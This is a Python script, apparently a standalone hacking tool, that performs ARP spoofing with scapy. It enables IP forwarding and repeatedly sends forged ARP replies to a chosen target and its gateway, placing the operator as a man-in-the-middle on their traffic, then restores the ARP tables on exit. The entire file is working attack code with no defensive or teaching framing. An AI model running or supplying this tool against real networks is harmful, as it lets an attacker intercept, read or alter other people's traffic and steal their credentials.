#!/usr/bin/env python

import scapy.all as scapy
import subprocess
import optparse
import time
import sys
import os
from termcolor import colored, cprint


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Set target ip.")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Set gateway/router ip.")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error(colored("[-] Please specify a target ip, use --help for more information.", 'red'))
    elif not options.gateway_ip:
        parser.error(colored("[-] Please specify a gateway/router ip, use --help for more information.", 'red'))
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    retries = 4
    for i in range(retries):
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()

target_ip = options.target_ip
gateway_ip = options.gateway_ip

subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

try:
    sent_packets_count = 0
    print(colored("Use CTRL + C to quit application.", 'blue', 'on_white'))
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        os.system('setterm -cursor off')
        print(colored("\r[+] Packets sent: ", 'green') + colored(str(sent_packets_count), 'green')),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print(colored("\n[+] Detected CTRL + C ... Resetting ARP table, please wait.\n", 'green'))
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    cprint("The ARP table has been restored. Exiting...", 'blue', 'on_white')
